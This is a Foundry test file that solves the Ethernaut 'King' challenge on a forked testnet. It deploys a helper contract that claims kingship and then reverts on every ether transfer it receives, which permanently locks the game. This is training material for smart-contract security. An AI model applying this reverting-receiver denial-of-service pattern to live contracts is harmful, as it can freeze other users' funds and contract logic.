// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {King} from "../../src/Ethernaut/King.sol";

contract KingAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        King king = King(payable(0x72d667443D1a8070B387f6195864689B4d1E6AF9));
        Helper helper = new Helper();
        helper.getKing{value: 0.001 ether}();
        vm.stopPrank();
        assertTrue(king._king() != 0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31);
    }
}

contract Helper {
    function getKing() public payable {
        address(0x72d667443D1a8070B387f6195864689B4d1E6AF9).call{
            value: 0.001 ether
        }("");
    }

    receive() external payable {
        revert();
    }
}
